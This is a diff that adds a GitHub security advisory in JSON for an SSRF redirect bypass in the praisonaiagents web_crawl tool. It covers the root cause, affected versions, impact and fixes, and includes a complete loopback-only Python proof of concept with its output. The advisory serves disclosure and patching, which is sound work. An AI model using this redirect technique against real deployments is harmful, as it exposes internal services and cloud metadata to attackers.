@@ -1,0 +1,137 @@
+{
+  "id": "GHSA-8hjw-25cg-g52h",
+  "modified": "2026-08-25T23:50:06.423119725Z",
+  "published": "2026-08-25T14:18:40Z",
+  "aliases": [
+    "CVE-2026-55523"
+  ],
+  "summary": "praisonaiagents has a `web_crawl` SSRF protection bypass via unchecked redirect targets",
+  "details": "## Summary\n\n`praisonaiagents.tools.web_crawl_tools.web_crawl()` validates the initial URL and blocks direct loopback/private destinations by default, but the default httpx fallback still uses `httpx.Client(follow_redirects=True)` and does not revalidate redirect targets.\n\nAn attacker-controlled public URL can pass the initial host check, redirect to loopback/private/cloud metadata infrastructure, and have the redirected response body returned by `web_crawl()`.\n\nThis appears to be an incomplete fix / patch bypass for the published `web_crawl` SSRF class (`GHSA-qq9r-63f6-v542` / `CVE-2026-40160`, and `GHSA-8f4v-xfm9-3244`).\n\n## Affected Component\n\nPackage:\n\n```text\npraisonaiagents\n```\n\nFile:\n\n```text\nsrc/praisonai-agents/praisonaiagents/tools/web_crawl_tools.py\n```\n\nFunctions:\n\n```text\nweb_crawl()\n_crawl_with_httpx()\n```\n\n## Affected Versions\n\nValidated affected:\n\n- `praisonaiagents 1.5.128` via repository tag `v4.5.128`;\n- `praisonaiagents 1.6.40` via repository tag `v4.6.40`;\n- `praisonaiagents 1.6.56` via repository tag `v4.6.56`;\n- current `origin/main` commit `095653d78a01cc6c80ff5b2dd20a8e5619686ddc`.\n\nSuggested affected range for maintainer confirmation:\n\n```text\n\u003e= 1.5.128, \u003c= 1.6.56\n```\n\nNo patched version is known to me at submission time.\n\n## Root Cause\n\nCurrent `web_crawl()` validates only the initially supplied URL:\n\n- requires `http` or `https`;\n- resolves the initial hostname with `socket.gethostbyname()`;\n- rejects loopback/private/link-local/multicast/unspecified addresses unless `ALLOW_LOCAL_CRAWL=true`.\n\nThe default fetch sink then follows redirects:\n\n```python\nwith httpx.Client(follow_redirects=True, timeout=30.0) as client:\n    response = client.get(url)\n```\n\nThere is no validation of intermediate or final redirect destinations before `httpx` fetches them. The URL that passes the guard is therefore not necessarily the URL ultimately requested by the server.\n\n## Local Reproduction\n\nThe PoV is local-only. It starts a loopback redirector and a loopback internal service. It monkeypatches DNS in-process so `attacker.test` appears public to the initial guard while the actual test request routes to the local redirector. This avoids contacting any third-party infrastructure while demonstrating the same root cause.\n\nRun from a checkout of the repository:\n\n```fish\nenv PYTHONPATH=src/praisonai-agents uv run --with httpx poc_web_crawl_redirect_ssrf.py\n```\n\nObserved output:\n\n```text\nDIRECT_CONTROL: {'error': 'No valid or safe URLs provided. Local and non-http(s) URLs are blocked for security.'}\nREDIRECT_RESULT: {'url': 'http://attacker.test:\u003cport\u003e/go', 'content': 'INTERNAL-SECRET-FROM-LOOPBACK', 'title': '', 'provider': 'httpx'}\nREDIRECT_SERVER_HIT: True\nINTERNAL_SERVER_HIT: True\nPRAI-CAND-001 CONFIRMED: web_crawl follows a redirect to loopback\n```\n\nThe direct control proves direct loopback is blocked by the intended SSRF guard. The redirect case proves the same blocked destination class is reachable after the initial safe-looking URL redirects.\n\nWith the same setup but with redirect following disabled, the redirector was hit, but the internal loopback service was not hit:\n\n```text\nREDIRECT_HIT: True\nINTERNAL_HIT: False\n```\n\n## Impact\n\nIf an attacker can influence URLs passed to `web_crawl()`, directly or through an agent/tool workflow, they can cause the PraisonAI host to fetch loopback, private-network, or cloud metadata endpoints reachable from that host. The response body is returned in the `web_crawl()` result.\n\nPractical impact includes:\n\n- reading loopback-only HTTP services;\n- probing private network services;\n- reading cloud metadata endpoints where reachable and not otherwise protected.\n\nThis report does not claim RCE, authentication bypass, or live cloud credential theft without a deployment-specific metadata test.\n\n## Severity\n\n\nThis mirrors the CVSS v4.0 shape already used for the prior `web_crawl` SSRF class while accounting for prompt/tool invocation as the attack prerequisite and user interaction. A CVSS v3.1 scoring may reasonably be lower if modeled strictly around user interaction, but the root issue is a server-side network boundary bypass that returns internal response content.\n\n## Suggested Fix\n\n- Set `follow_redirects=False` in `_crawl_with_httpx()`, or handle redirects manually and validate each `Location` target before following it.\n- Centralize the URL validation used by server-side fetch tools.\n- Validate every resolved address using `socket.getaddrinfo()`, not only the first `gethostbyname()` result.\n- Reject loopback, private, link-local, reserved, multicast, unspecified, and cloud metadata destinations.\n- Add regression tests for direct loopback, public-to-loopback redirect, and allowed public-to-public redirects if redirect support remains intended.\n\n## PoV\n\n```python\n#!/usr/bin/env python3\n\"\"\"Local PoV for PraisonAI web_crawl redirect-target SSRF bypass.\n\nThis PoV uses only loopback servers. It monkeypatches DNS in-process so the initial attacker host looks public to PraisonAI's pre-request guard, while the HTTP request is routed to a local redirect server. The redirect target is a loopback-only internal service. The vulnerable behavior is that web_crawl() validates the initial URL but follows the redirect to loopback without revalidating the Location target.\n\"\"\"\n\nfrom __future__ import annotations\n\nimport http.server\nimport os\nimport socket\nimport socketserver\nimport threading\nfrom typing import Any\n\nfrom praisonaiagents.tools.web_crawl_tools import web_crawl\n\n\nclass InternalHandler(http.server.BaseHTTPRequestHandler):\n    body = b\"INTERNAL-SECRET-FROM-LOOPBACK\"\n\n    def do_GET(self) -\u003e None:  # noqa: N802\n        self.server.hit = True  # type: ignore[attr-defined]\n        self.send_response(200)\n        self.send_header(\"Content-Type\", \"text/plain\")\n        self.send_header(\"Content-Length\", str(len(self.body)))\n        self.end_headers()\n        self.wfile.write(self.body)\n\n    def log_message(self, *_args: Any) -\u003e None:\n        return\n\n\nclass RedirectHandler(http.server.BaseHTTPRequestHandler):\n    target = \"\"\n\n    def do_GET(self) -\u003e None:  # noqa: N802\n        self.server.hit = True  # type: ignore[attr-defined]\n        self.send_response(302)\n        self.send_header(\"Location\", self.target)\n        self.end_headers()\n\n    def log_message(self, *_args: Any) -\u003e None:\n        return\n\n\ndef main() -\u003e int:\n    os.environ.pop(\"ALLOW_LOCAL_CRAWL\", None)\n\n    internal = socketserver.TCPServer((\"127.0.0.1\", 0), InternalHandler)\n    internal.hit = False  # type: ignore[attr-defined]\n    internal_port = internal.server_address[1]\n\n    RedirectHandler.target = f\"http://127.0.0.1:{internal_port}/secret\"\n    redirect = socketserver.TCPServer((\"127.0.0.1\", 0), RedirectHandler)\n    redirect.hit = False  # type: ignore[attr-defined]\n    redirect_port = redirect.server_address[1]\n\n    threading.Thread(target=internal.serve_forever, daemon=True).start()\n    threading.Thread(target=redirect.serve_forever, daemon=True).start()\n\n    original_gethostbyname = socket.gethostbyname\n    original_getaddrinfo = socket.getaddrinfo\n\n    def fake_gethostbyname(host: str) -\u003e str:\n        if host == \"attacker.test\":\n            return \"93.184.216.34\"\n        return original_gethostbyname(host)\n\n    def fake_getaddrinfo(host: str, port: int, *args: Any, **kwargs: Any):\n        if host == \"attacker.test\":\n            return original_getaddrinfo(\"127.0.0.1\", port, *args, **kwargs)\n        return original_getaddrinfo(host, port, *args, **kwargs)\n\n    socket.gethostbyname = fake_gethostbyname\n    socket.getaddrinfo = fake_getaddrinfo\n    try:\n        direct_control = web_crawl(\n            f\"http://127.0.0.1:{internal_port}/secret\",\n            provider=\"httpx\",\n        )\n        redirect_result = web_crawl(\n            f\"http://attacker.test:{redirect_port}/go\",\n            provider=\"httpx\",\n        )\n    finally:\n        socket.gethostbyname = original_gethostbyname\n        socket.getaddrinfo = original_getaddrinfo\n        redirect.shutdown()\n        internal.shutdown()\n        redirect.server_close()\n        internal.server_close()\n\n    print(\"DIRECT_CONTROL:\", direct_control)\n    print(\"REDIRECT_RESULT:\", redirect_result)\n    print(\"REDIRECT_SERVER_HIT:\", bool(redirect.hit))  # type: ignore[attr-defined]\n    print(\"INTERNAL_SERVER_HIT:\", bool(internal.hit))  # type: ignore[attr-defined]\n\n    if not isinstance(direct_control, dict) or \"No valid or safe URLs\" not in str(direct_control):\n        raise SystemExit(\"control failed: direct loopback was not blocked\")\n    if not isinstance(redirect_result, dict):\n        raise SystemExit(\"bypass failed: unexpected result type\")\n    if \"INTERNAL-SECRET-FROM-LOOPBACK\" not in str(redirect_result.get(\"content\", \"\")):\n        raise SystemExit(\"bypass failed: redirect target content was not returned\")\n    if not bool(redirect.hit) or not bool(internal.hit):  # type: ignore[attr-defined]\n        raise SystemExit(\"bypass failed: expected local servers were not hit\")\n\n    print(\"PRAI-CAND-001 CONFIRMED: web_crawl follows a redirect to loopback\")\n    return 0\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n```",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "praisonaiagents",
+        "purl": "pkg:pypi/praisonaiagents"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "1.5.128"
+            },
+            {
+              "fixed": "1.6.58"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "1.5.128",
+        "1.5.129",
+        "1.5.130",
+        "1.5.131",
+        "1.5.132",
+        "1.5.133",
+        "1.5.134",
+        "1.5.135",
+        "1.5.136",
+        "1.5.137",
+        "1.5.138",
+        "1.5.139",
+        "1.5.140",
+        "1.5.141",
+        "1.5.142",
+        "1.5.143",
+        "1.5.144",
+        "1.5.145",
+        "1.5.146",
+        "1.5.147",
+        "1.5.148",
+        "1.5.149",
+        "1.6.1",
+        "1.6.10",
+        "1.6.11",
+        "1.6.12",
+        "1.6.13",
+        "1.6.14",
+        "1.6.15",
+        "1.6.16",
+        "1.6.17",
+        "1.6.18",
+        "1.6.19",
+        "1.6.2",
+        "1.6.20",
+        "1.6.21",
+        "1.6.22",
+        "1.6.23",
+        "1.6.24",
+        "1.6.25",
+        "1.6.26",
+        "1.6.27",
+        "1.6.28",
+        "1.6.29",
+        "1.6.3",
+        "1.6.30",
+        "1.6.31",
+        "1.6.32",
+        "1.6.33",
+        "1.6.34",
+        "1.6.35",
+        "1.6.36",
+        "1.6.37",
+        "1.6.38",
+        "1.6.39",
+        "1.6.4",
+        "1.6.40",
+        "1.6.41",
+        "1.6.42",
+        "1.6.43",
+        "1.6.44",
+        "1.6.45",
+        "1.6.46",
+        "1.6.47",
+        "1.6.48",
+        "1.6.5",
+        "1.6.50",
+        "1.6.51",
+        "1.6.52",
+        "1.6.53",
+        "1.6.54",
+        "1.6.55",
+        "1.6.56",
+        "1.6.57",
+        "1.6.6",
+        "1.6.7",
+        "1.6.8",
+        "1.6.9"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/08/GHSA-8hjw-25cg-g52h/GHSA-8hjw-25cg-g52h.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-8hjw-25cg-g52h"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-55523"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/MervinPraison/PraisonAI/commit/2f9677abb2ea68eab864ee8b6a828fd0141612e1"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/MervinPraison/PraisonAI"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/MervinPraison/PraisonAI/releases/tag/v4.6.58"
+    }
+  ]
+}
